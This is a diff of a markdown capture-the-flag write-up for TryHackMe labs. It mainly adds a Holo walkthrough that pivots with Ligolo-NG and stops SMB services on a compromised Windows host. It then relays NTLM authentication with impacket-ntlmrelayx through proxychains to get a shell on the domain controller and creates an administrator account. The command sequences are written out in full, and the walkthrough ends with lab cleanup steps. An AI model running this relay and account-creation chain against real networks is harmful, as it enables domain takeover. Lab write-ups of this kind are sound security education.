@@ -749,11 +749,15 @@ Some notes in case the payload will not work:
 3. After you get the error, to get the flag, wait 30 seconds and send the reguqest to read the messages:
 
        GET /getMessages HTTP/2
-     You should get the flag inside the JSON response inside the JSON body
 4. You should try a couple of time to succeed, in case after 3 attempts you didn't get the flag try to restart El Bandito, in my case solved the problem.
 5. The flag has an ecoded character that you need to decode before to submit the flag.     
 
 ## Holo
+
+### Notes
+I didn't follow Tryhackme lab walk-through, so if you follows this write up you will be able to discover only the flags (Task 4). Neither I use metasploit, as usual I try to avoid this tool. I used Ligolo-NG to implement pivoting and port forwarding. This really a great tool and I suggest everyone to use it.
+
+### The challange
 Connect to VPN and check your route:
 
     10.200.95.0     10.50.74.1      255.255.255.0   UG    1000   0        0 tun0
@@ -900,7 +904,7 @@ Once I got a shell, inspecting network configuration:
 ### Flag submission 1
 In /var subdirs you can find the first flag.
 
-### Privilege escaltion (without result)
+### Trying Privilege escaltion
 At this point I performed some basic controls to try to escalate my privileges. I searched for files containing juicy information:
 
     grep -Ril "password" /var/www  2> /dev/null
@@ -1715,53 +1719,107 @@ A new administrator cmd window should appear. I added the created user to the re
 
     net localgroup "Remote Desktop Users" support.it /add
 
-And I logged in with this user.
+And I logged in as the newly created user to PC-FILESRV01, with RDP
 
 The next target is the domain controller. As we know we have to set up an NTML relay attack. The main problem here is that our attacker machine is not directed connected to the holo network, so we need to forward the traffic to us. The others requiremnts are satisfied since:
 - We have compromised with administrator privileges: PC-FILESRV01
 - THe target host has not SMB strict sign enabled: DC-SRV01
 
-The other server (S-SRV02) inside the network cannot be use as target since SMB is not enabled. As said before, since we need to forward the SMB traffic from the compromoside host (PC-FILESRV01) to our attacker machine. To accomplish the task first I set another listener to the Ligolo agent on 10.200.95.33
+The other server (S-SRV02) inside the network cannot be use as target since SMB is not enabled. As said before, since we need to forward the SMB traffic from the compromoside host (PC-FILESRV01) to our attacker machine. To accomplish the task first I set another listener to the Ligolo agent on 10.200.95.33. This lisstener will forward all the SMB traffic from the agent (10.200.95.33) to our attacker machine, this will become clearer later:
 
     listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
 
-Now we need to perform an invasive action, since we are going to stop lanmanserver service (and related services) and reboot the system in order to free port 445:
+Now we need to perform an invasive action, since we are going to stop all SMB related services and reboot the system in order to free port 445. Perform the following commands in a CMD running as administrator:
    
+    sc stop netlogon
     sc stop lanmanserver
+    sc config lanmanserver start= disabled
+    sc stop sessionenv
+    sc stop lanmanworkstation
+    sc config lanmanworkstation start= disabled
 
-But I got an error:
+Then reboot the server. Wait a couple of minutes and connect back to the server. <b>If you use Remmina, sice it requires Netlogon service, it will fail. The only tool that works is Rdesktop</b>:
 
-    A stop control has been sent to a service that other running services are dependent on.
+    rdesktop -u support.it 10.200.95.35
 
-So there is a dependency active for the service. Using powershell we can find which service depends on:
-
-    PS C:\Windows\system32> Get-Service -Name lanmanserver  -DependentServices
-    
-    Status   Name               DisplayName
-    ------   ----               -----------
-    Running  Netlogon           Netlogon
-
-This is an issue, we cannot disable the netlogon since we won't be able to connect to the server using RDP, indeed Netlogon authenticates users and other services within a domain. 
-
-Then reboot:
-
-    shutdown -r -t 0
-
-Once the machine comes up again we can verify that SMB is off:
+Verify that SMB is off:
 
     netstat -an | findstr :445
 
-The command must return nothing. At this point I set a portforwarding rule in PC-FILESRV01 to forward incoming SMB traffic to the agent:
+Should return nothing. If you find that a service is still running probably is due to a firewall port forwarding rule left active from other user (e.g using meterpreter). Check it out with:
+
+    netsh interface portproxy show all
+Check the clean up section on how to delete a rule.
+
+At this point I set a portforwarding rule in PC-FILESRV01 to forward incoming SMB traffic to the agent (see the above listener).
 
     netsh interface portproxy add v4tov4 listenport=445 listenaddress=10.200.95.35 connectport=445 connectaddress=10.200.95.33
 
-Now on our attacker machine we can lunch the attacker:
+So the flow we set up is:
 
-    impacket-ntlmrelayx -t smb://10.200.95.30 -smb2support -i
+    Incoming SMB req. to PC-FILESRV01 --> FW rules forwards the request to ligolol agent (10.200.95.33) listener (445) --> the listener forward SMB request to our attacker machine
 
-The -i flag will lunch an interactive session once a connection is caugth.
+Now on our attacker machine start the relay listener
+
+    impacket-ntlmrelayx -t smb://10.200.95.30 -smb2support -socks
+
+In a while we should recive the request:
+
+    *] SMBD-Thread-9 (process_request_thread): Received connection from 127.0.0.1, attacking target smb://10.200.95.30
+    [-] Unsupported MechType 'MS KRB5 - Microsoft Kerberos 5'
+    [*] Authenticating against smb://10.200.95.30 as HOLOLIVE/SRV-ADMIN SUCCEED
+    [*] SOCKS: Adding HOLOLIVE/SRV-ADMIN@10.200.95.30(445) to active SOCKS connection. Enjoy
+    ...
+
+Now we have an active socks on port 1080 that we can exploit. To intercat with this sock we can use proxychains. Change the configuration file as follows:
+
+    cat /etc/proxychains.conf  
+    ...
+    [ProxyList]
+    # add proxy here ...
+    # meanwile
+    # defaults set to "tor"
+    #socks4         127.0.0.1 9050
+    socks4          127.0.0.1 1080
+
+<b>Note that on Kali 2024.2 the defaul configuration file is /etc/proxychains4.conf and you need to renamed it</b>. Finally we can perform the last step, to get a shell in the Domain controller:
+
+    proxychains impacket-smbexec -no-pass HOLOLIVE/SRV-ADMIN@10.200.95.30
+
+    [proxychains] config file found: /etc/proxychains.conf
+    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+    ...
+    [proxychains] DLL init: proxychains-ng 4.17
+    Impacket v0.12.0.dev1 - Copyright 2023 Fortra
     
+    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.95.30:445  ...  OK
+    [!] Launching semi-interactive shell - Careful what you execute
+    C:\Windows\system32>
 
+Then I added a new user to the administrator group:
+
+    net user support.it Pwd1234 /add
+    net localgroup Administrators /add support.it
+    net localgroup "Remote Desktop Users" /add support.it
+
+Log to rdp and find the last flag.
+    
+### Clean Up
+Sinc the lab is shared it's a good practice to restore the services on PC-FILESRV01. Perform the following action in a CMD as administrator:
+Delete FW rule:
+
+    netsh interface portproxy delete v4tov4 listenport=445 listenaddress=10.200.95.35
+
+Start the services
+
+    sc config lanmanworkstation start= auto
+    sc start lanmanworkstation
+    sc start sessionenv
+    sc config lanmanserver start= auto
+    sc start lanmanserver
+    sc start netlogon
+
+Restart the server
 
 
 
